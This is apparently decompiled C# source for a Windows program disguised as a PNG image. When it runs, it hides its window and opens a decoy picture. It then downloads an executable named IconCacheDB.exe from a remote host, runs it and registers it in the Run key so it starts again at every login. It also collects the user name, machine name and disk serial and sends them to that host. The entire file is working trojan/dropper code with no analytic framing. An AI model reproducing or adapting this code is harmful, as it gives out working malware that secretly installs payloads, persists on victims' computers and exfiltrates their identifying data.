using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Image_PNG;

public class Form1 : Form
{
	private string string14 = "EMPTY";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		string tempPath = Path.GetTempPath();
		WebClient webClient = new WebClient();
		string uriString = "http://i.imgur.com/DNz2VgW.jpg";
		string fileName = tempPath + "screenshot_17_4.png";
		Uri address = new Uri(uriString);
		webClient.DownloadFileAsync(address, fileName);
		Process process = new Process();
		process.StartInfo.FileName = tempPath + "screenshot_17_4.png";
		while (new FileInfo(fileName).Length == 0L)
		{
			Thread.Sleep(500);
		}
		Thread.Sleep(500);
		try
		{
			process.Start();
		}
		catch
		{
		}
		string text = Path.GetTempPath().Remove(Path.GetTempPath().LastIndexOf("\\")).Remove(Path.GetTempPath().Remove(Path.GetTempPath().LastIndexOf("\\")).LastIndexOf("\\"));
		WebClient webClient2 = new WebClient();
		string uriString2 = "http://image-png.us/UPDATE.php?F1=1";
		string text2 = text + "\\IconCacheDB.exe";
		Uri address2 = new Uri(uriString2);
		webClient2.DownloadFileAsync(address2, text2);
		Process process2 = new Process();
		process2.StartInfo.FileName = text + "\\IconCacheDB.exe";
		while (new FileInfo(text + "\\IconCacheDB.exe").Length == 0L)
		{
			Thread.Sleep(500);
		}
		Thread.Sleep(500);
		try
		{
			process2.Start();
		}
		catch
		{
		}
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		try
		{
			registryKey.SetValue("IconCacheDB", text2);
			registryKey.Close();
		}
		catch
		{
		}
		string26("wmic DISKDRIVE GET SerialNumber");
		if (string14 == "EMPTY")
		{
			string26("wmic PATH Win32_PhysicalMedia GET SerialNumber");
		}
		if (string14 == "EMPTY")
		{
			string26("wmic PATH Win32_DiskDrive GET SerialNumber");
		}
		string12("http://image-png.us/Z0.php?mail=tsecret467", "info4=@gmail.com&info3=[" + SystemInformation.get_UserName() + "]&info2=[" + Environment.MachineName + "]&info1=[" + string14 + "]");
		((Control)this).set_Enabled(false);
		Application.Exit();
	}

	private string string12(string string10, string string20)
	{
		WebRequest webRequest = WebRequest.Create(string10);
		webRequest.Method = "POST";
		webRequest.Timeout = 100000;
		webRequest.ContentType = "application/x-www-form-urlencoded";
		byte[] bytes = Encoding.GetEncoding(1251).GetBytes(string20);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		return null;
	}

	private string string26(string string27)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c " + string27);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = new Process();
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding(866);
			process.StartInfo = processStartInfo;
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			string14 = text.Replace(Environment.NewLine, "").Replace(" ", "").Replace("\r", "")
				.Replace("\n", "")
				.Replace("\r\n", "");
		}
		catch
		{
		}
		return null;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
